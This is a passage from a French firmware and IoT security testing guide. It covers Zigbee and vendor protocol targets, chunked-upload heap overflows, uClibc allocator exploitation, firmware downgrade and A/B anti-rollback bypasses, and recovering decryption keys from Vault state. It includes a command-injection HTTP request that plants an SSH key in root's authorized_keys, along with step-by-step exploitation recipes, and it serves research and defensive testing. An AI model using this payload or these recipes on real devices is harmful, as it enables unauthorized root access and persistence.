Cette architecture crée deux cibles de reverse engineering au lieu d’une. Si le contrôleur convertit les trames radio binaires en un protocole textuel tel que `Group,Command,arg1,arg2,...`, retrouvez :

- Les **groupes de messages** et les tables de dispatch
- Les messages pouvant provenir du **réseau** plutôt que du contrôleur lui-même
- Les champs discriminateurs exacts spécifiques au fabricant (par exemple Zigbee `manufacturer_code` et `cluster_command` personnalisé)
- Les gestionnaires accessibles uniquement pendant les phases d’**appairage**, de découverte ou de téléchargement du firmware/modèle

Pour Zigbee en particulier, capturez le trafic d’appairage et vérifiez si la cible utilise toujours la **Link Key** par défaut `ZigBeeAlliance09`. Si c’est le cas, l’écoute du trafic d’appairage peut révéler la **Network Key**. Les codes d’installation Zigbee 3.0 réduisent cette exposition : vérifiez donc si l’appareil testé les impose réellement.

### Gestionnaires de protocoles spécifiques au fabricant et accessibilité contrôlée par FSM

Les commandes Zigbee/ZCL spécifiques au fabricant constituent souvent une meilleure cible que les clusters standardisés, car elles alimentent du **code d’analyse personnalisé** et des **FSM** internes, dont la validation a été moins éprouvée.<sup>[[8]](#references)</sup>

Méthode pratique :

- Remontez le dispatcher des commandes jusqu’à trouver le **gestionnaire réservé au fabricant**.
- Retrouvez les tables des **états**, **événements**, **vérifications**, **actions** et **états suivants** de la FSM.
- Repérez les **états transitoires** qui avancent automatiquement, ainsi que les branches de nouvelle tentative ou d’erreur qui finissent par réinitialiser ou libérer l’état contrôlé par l’attaquant.
- Confirmez les échanges légitimes du protocole nécessaires pour placer le daemon dans l’état vulnérable, au lieu de supposer que le gestionnaire bogué est toujours accessible.

Pour les protocoles sensibles au timing, la relecture de paquets depuis un framework Python peut être trop lente. Une méthode plus fiable consiste à émuler un appareil légitime sur du matériel réel (par exemple un **nRF52840**) avec une pile de qualité fabricant, afin d’exposer les bons **endpoints**, **attributs** et le timing d’appairage.

### Classe de bogues liée aux téléchargements fragmentés dans les daemons embarqués

Une classe récurrente de bogues de firmware apparaît dans les téléchargements fragmentés de blob/modèle/configuration :<sup>[[8]](#references)</sup>

1. Le **premier fragment** (`offset == 0`) stocke `ctx->total_size` et alloue `malloc(total_size)`.
2. Les fragments suivants ne valident que les champs **locaux au paquet** contrôlés par l’attaquant, tels que `packet_total_size >= offset + chunk_len`.
3. La copie utilise `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sans vérifier que la taille ne dépasse pas la **taille initialement allouée**.

Un attaquant peut alors envoyer :

- Un premier fragment valide avec une taille totale déclarée **faible** pour forcer une petite allocation sur le tas.
- Un fragment ultérieur avec l’**offset attendu**, mais un `chunk_len` plus grand.
- Une taille locale au paquet falsifiée qui satisfait les vérifications récentes tout en faisant déborder le buffer initialement alloué.

Lorsque le chemin vulnérable dépend de la logique d’appairage, l’exploitation doit inclure suffisamment d’**émulation d’appareil** pour amener la cible à l’état attendu de téléchargement de modèle ou de blob avant d’envoyer les fragments malformés.

### Déclencheurs de `free()` pilotés par le protocole

Dans les daemons embarqués, le moyen le plus simple de déclencher l’exploitation des métadonnées du tas consiste souvent non pas à « attendre le nettoyage », mais à **forcer la gestion des erreurs du protocole lui-même** :<sup>[[8]](#references)</sup>

- Envoyez des fragments de suivi malformés pour faire passer la FSM à des états de **nouvelle tentative** ou d’**erreur**.
- Dépassez le seuil de tentatives pour que le daemon **réinitialise le contexte** et libère le buffer corrompu.
- Utilisez cet appel prévisible à `free()` pour déclencher des primitives côté allocateur avant que le processus ne plante pour d’autres raisons.

Cette méthode est particulièrement utile contre les allocateurs **de type musl/uClibc/dlmalloc** sous Linux embarqué, où la corruption des métadonnées de chunk peut transformer la logique unlink/unbin en primitive d’écriture. Une méthode stable consiste à corrompre un **champ de taille** pour rediriger le parcours de l’allocateur vers des **faux chunks placés dans le buffer débordé**, plutôt que d’écraser immédiatement de vrais pointeurs de bin et de faire planter le processus.

## Exploitation binaire et preuve de concept

Développer un PoC pour les vulnérabilités identifiées nécessite une compréhension approfondie de l’architecture cible et de la programmation en langages de bas niveau. Les protections d’exécution binaire sont rares dans les systèmes embarqués, mais lorsqu’elles sont présentes, des techniques comme Return Oriented Programming (ROP) peuvent être nécessaires.

### Notes sur l’exploitation des fastbins uClibc (Linux embarqué)

- **Fastbins et consolidation :** uClibc utilise des fastbins similaires à ceux de glibc. Une allocation importante ultérieure peut déclencher `__malloc_consolidate()` : tout faux chunk doit donc satisfaire les vérifications (taille plausible, `fd = 0` et chunks voisins considérés comme « utilisés »).<sup>[[6]](#references)</sup>
- **Binaires non-PIE sous ASLR :** si ASLR est activé, mais que le binaire principal est **non-PIE**, les adresses `.data/.bss` du binaire sont stables. Vous pouvez cibler une zone qui ressemble déjà à un en-tête de chunk valide pour faire aboutir une allocation fastbin sur une **table de pointeurs de fonctions**.
- **NUL qui interrompt le parseur :** lorsque le JSON est analysé, un `\x00` dans la charge utile peut interrompre l’analyse tout en conservant les octets contrôlés par l’attaquant qui suivent, pour un pivot de pile ou une chaîne ROP.
- **Shellcode via `/proc/self/mem` :** une chaîne ROP qui appelle `open("/proc/self/mem")`, `lseek()` et `write()` peut déposer du shellcode exécutable dans une zone mémoire connue et y transférer l’exécution.

## Systèmes d’exploitation préparés pour l’analyse de firmware

Des systèmes d’exploitation comme [AttifyOS](https://github.com/adi0x90/attifyos) et [EmbedOS](https://github.com/scriptingxss/EmbedOS) fournissent des environnements préconfigurés pour les tests de sécurité des firmwares, équipés des outils nécessaires.

## Systèmes d’exploitation préparés pour analyser les firmwares

- [**AttifyOS**](https://github.com/adi0x90/attifyos) : AttifyOS est une distribution conçue pour vous aider à évaluer la sécurité et à effectuer des tests d’intrusion sur des appareils de l’Internet des objets (IoT). Elle vous fait gagner beaucoup de temps en fournissant un environnement préconfiguré avec tous les outils nécessaires.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS) : système d’exploitation pour les tests de sécurité embarqués, basé sur Ubuntu 18.04 et préchargé avec des outils de test de sécurité des firmwares.

## Attaques par downgrade de firmware et mécanismes de mise à jour non sécurisés

Même lorsqu’un fabricant met en œuvre la vérification des signatures cryptographiques des images de firmware, la **protection contre le retour à une version antérieure (downgrade) est souvent omise**. Lorsque le chargeur de démarrage ou de récupération vérifie uniquement la signature avec une clé publique intégrée, sans comparer la *version* (ou un compteur monotone) de l’image installée, un attaquant peut installer légitimement un **ancien firmware vulnérable portant toujours une signature valide**, réintroduisant ainsi des vulnérabilités corrigées.<sup>[[4]](#references)</sup>

Déroulement typique de l’attaque :

1. **Obtenir une ancienne image signée**
   * La récupérer sur le portail de téléchargement public du fabricant, son CDN ou son site d’assistance.
   * L’extraire des applications mobiles/de bureau associées (par exemple dans `assets/firmware/` d’un APK Android).
   * La récupérer dans des dépôts tiers tels que VirusTotal, des archives Internet, des forums, etc.
2. **Téléverser ou servir l’image à l’appareil** via un canal de mise à jour exposé :
   * Interface web, API d’application mobile, USB, TFTP, MQTT, etc.
   * De nombreux appareils IoT grand public exposent des endpoints HTTP(S) *non authentifiés* qui acceptent des blobs de firmware encodés en Base64, les décodent côté serveur et déclenchent la récupération ou la mise à niveau.
3. Après le downgrade, exploiter une vulnérabilité corrigée dans une version plus récente (par exemple un filtre contre l’injection de commandes ajouté ultérieurement).
4. Si nécessaire, réinstaller la dernière image ou désactiver les mises à jour pour éviter d’être détecté après avoir obtenu la persistance.

### Exemple : injection de commandes après un downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Dans le firmware vulnérable (rétrogradé), le paramètre `md5` est concaténé directement à une commande shell sans assainissement, ce qui permet d’injecter des commandes arbitraires (ici, pour activer l’accès root par clé SSH). Les versions ultérieures du firmware ont introduit un filtre basique de caractères, mais l’absence de protection contre le downgrade rend ce correctif inopérant.<sup>[[4]](#references)</sup>

### Extraction du firmware depuis des applications mobiles

De nombreux fabricants intègrent des images complètes du firmware dans leurs applications mobiles associées afin que l’application puisse mettre à jour l’appareil via Bluetooth/Wi-Fi. Ces packages sont généralement stockés sans chiffrement dans l’APK/APEX, sous des chemins tels que `assets/fw/` ou `res/raw/`. Des outils comme `apktool`, `ghidra` ou même le simple `unzip` permettent d’extraire les images signées sans toucher au matériel physique.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Contournement de l’anti-rétrogradation limité à l’updater dans les architectures à slots A/B

Certains fournisseurs implémentent bien un **mécanisme anti-rétrogradation**, mais uniquement dans la logique de l’*updater* (par exemple une routine UDS sur CAN, une commande de récupération ou un agent OTA en espace utilisateur). Si le **bootloader** ne vérifie ensuite que la signature/CRC de l’image et fait confiance à la table de partitions ou aux métadonnées des slots, la protection contre le rollback peut toujours être contournée.<sup>[[7]](#references)</sup>

Conception faible typique :

- Les métadonnées du firmware contiennent à la fois un descripteur de version et un **compteur anti-rétrogradation** monotone.
- L’updater compare le compteur de l’image à une valeur stockée de manière persistante et rejette les anciennes images signées.
- Le bootloader **ne** lit **pas** ce compteur et vérifie uniquement l’en-tête, le CRC et la signature avant de démarrer le slot sélectionné.
- L’activation du slot est stockée séparément dans une table de partitions ou dans un compteur de génération propre à chaque slot, et n’est **pas liée cryptographiquement** au digest exact du firmware qui a été validé.

Cela crée un mécanisme permettant de **valider une image et d’en démarrer une autre** dans les systèmes à double slot. Si l’attaquant peut faire marquer le slot B comme prochaine cible de démarrage par l’updater à l’aide d’une image signée actuelle, puis écraser le slot B avant le redémarrage, le bootloader peut tout de même démarrer l’image rétrogradée, car il ne fait confiance qu’aux métadonnées du slot déjà validées.

Schéma d’abus courant :

1. Téléverser un firmware **actuel et signé** dans le slot passif, puis exécuter la routine normale de validation/basculement pour que la configuration marque ce slot comme prochain slot actif.
2. **Ne pas redémarrer tout de suite**. Relancer la routine de préparation/effacement du slot dans la même session.
3. Exploiter un état de démarrage obsolète ou une logique de sélection de slot obsolète afin que l’updater efface le **même slot physique** que celui qui vient d’être promu.
4. Écrire un firmware **plus ancien, mais toujours signé**, dans ce slot.
5. Ignorer la routine de validation qui applique le compteur anti-rétrogradation et redémarrer directement.
6. Le bootloader sélectionne le slot promu, vérifie uniquement la signature/l’intégrité et démarre l’ancienne image.

Points à examiner lors de la rétro-ingénierie des implémentations de mise à jour A/B :

- La sélection du slot repose sur des **indicateurs de démarrage** qui ne sont pas actualisés après un basculement réussi.
- Une routine du type `prepare_passive_slot()` efface un slot en se basant sur un état obsolète plutôt que sur la **configuration actuellement validée**.
- Une fonction du type `part_write_layout()` ne fait qu’incrémenter un **compteur de génération** / indicateur de slot actif et ne stocke pas le hash de l’image validée.
- Les vérifications du compteur anti-rétrogradation sont implémentées en espace utilisateur ou dans le code de l’updater, mais **pas** dans la ROM / le bootloader / les étapes de secure boot.
- Les routines d’effacement ou de récupération laissent le slot marqué comme démarrable même après que son contenu a été supprimé et réécrit.

### Liste de contrôle pour évaluer la logique de mise à jour

* Le transport et l’authentification du *point de terminaison de mise à jour* sont-ils suffisamment protégés (TLS + authentification) ?
* L’appareil compare-t-il les **numéros de version** ou un **compteur anti-rétrogradation monotone** avant le flashage ?
* L’image est-elle vérifiée au sein d’une chaîne de secure boot (par exemple, les signatures sont-elles vérifiées par le code ROM) ?
* Le **bootloader applique-t-il le même mécanisme anti-rétrogradation** que l’updater, au lieu de vérifier uniquement la signature/CRC ?
* Les métadonnées d’activation du slot sont-elles **liées au digest/à la version du firmware validé**, ou le slot peut-il être modifié après sa promotion ?
* Après la réussite d’un basculement de slot, l’appareil est-il forcé à redémarrer ou d’autres routines de mise à jour/d’effacement restent-elles accessibles dans la même session ?
* Le code en espace utilisateur effectue-t-il des vérifications de cohérence supplémentaires (par exemple, la carte de partitions autorisée, le numéro de modèle) ?
* Les flux de mise à jour *partiels* ou de *sauvegarde* réutilisent-ils la même logique de validation ?

> 💡  Si l’un des éléments ci-dessus manque, la plateforme est probablement vulnérable aux attaques par rollback.

## Firmwares vulnérables pour s’entraîner

Pour vous entraîner à découvrir des vulnérabilités dans des firmwares, utilisez les projets de firmware vulnérables suivants comme point de départ.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Récupérer des clés de déchiffrement de firmware à partir de l’état intégré de KMS/Vault

Lorsqu’une image de mise à jour mélange de petites métadonnées en clair avec un grand blob à forte entropie, commencez par analyser le conteneur avant toute tentative de force brute :<sup>[[1]](#references)</sup>

- Extrayez les en-têtes, les offsets et les limites de lignes à l’aide de `hexdump`, `xxd`, `strings -tx`, `base64 -d` et `binwalk -E`.
- `Salted__` indique généralement le format OpenSSL `enc` : les 8 octets suivants correspondent au sel et les octets restants au texte chiffré.
- Un champ Base64 qui se décode en exactement `256` octets indique fortement qu’il s’agit d’un texte chiffré RSA-2048 qui encapsule un mot de passe de firmware ou une clé de session aléatoire.
- Les données PGP détachées présentes dans le même fichier protègent souvent uniquement l’authenticité ; ne supposez pas qu’elles assurent la confidentialité.

Si la recherche statique de clés (`grep`, `strings`, recherches PEM/PGP) échoue, rétro-ingénieriez plutôt le **chemin opérationnel de déchiffrement** au lieu de chercher uniquement des clés privées :

- Décompilez le binaire de mise à jour/de gestion et suivez le chemin : qui lit le blob chiffré, quel helper/API le déchiffre et quel nom de clé logique est demandé.
- Recherchez dans le système de fichiers racine extrait l’état de KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), ainsi que les fichiers unit et les scripts d’initialisation.
- Traitez les commandes `vault operator unseal ...` en clair, les clés de récupération, les jetons d’amorçage ou les scripts locaux d’auto-déverrouillage KMS comme des équivalents de matériel de clé privée.

Si l’appliance fournit le binaire Vault d’origine et son backend de stockage, reproduire cet environnement est généralement plus simple que de réimplémenter les composants internes de Vault :

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Avec les privilèges root sur le clone de KMS :

- Rendez les clés transit exportables uniquement dans le clone isolé : `vault write transit/keys/<name>/config exportable=true`
- Exportez la clé de déchiffrement : `vault read transit/export/encryption-key/<name>`
- Essayez la clé RSA récupérée avec la paire padding/hash exacte utilisée par le KMS. Un échec du déchiffrement PKCS#1 v1.5 et un échec du déchiffrement OAEP par défaut ne prouvent **pas** que la clé est incorrecte ; de nombreux flux basés sur Vault utilisent OAEP avec SHA-256, alors que les bibliothèques courantes utilisent SHA-1 par défaut.
- Si le payload commence par `Salted__`, reproduisez exactement le KDF OpenSSL du fournisseur (`EVP_BytesToKey`, souvent MD5 sur les appareils anciens) avant de tenter le déchiffrement AES-CBC.

Cela transforme le problème du « firmware chiffré » en un problème plus général : **récupérer les clés opérationnelles côté appareil, puis reproduire hors ligne les paramètres exacts de déchiffrement et de KDF**.

## Formations et certifications

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Craquer un firmware avec Claude : compétences de niveau senior, autonomie de niveau junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Méthodologie de test de sécurité des firmwares](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking : le guide définitif pour attaquer l’Internet des objets](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Exploiter des zero days dans du matériel abandonné – blog de Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Comment un appareil connecté à 20 $ m’a donné accès à votre maison](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Maintenant, vous voyez mi : maintenant, vous êtes Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Exploiter le Tesla Wall Connector depuis son connecteur de charge - Partie 2 : contourner l’anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Faites-le clignoter : exploitation over-the-air du Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS sur QEMU, partie 1 : dépaquetage](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Documentation du noyau Linux - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS sur QEMU, partie 2 : débogage et correctifs](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Mots de passe du BIOS Dell : le chiffrement XOR faible permet la récupération depuis la mémoire flash SPI (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Outil de récupération des mots de passe du BIOS Dell](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
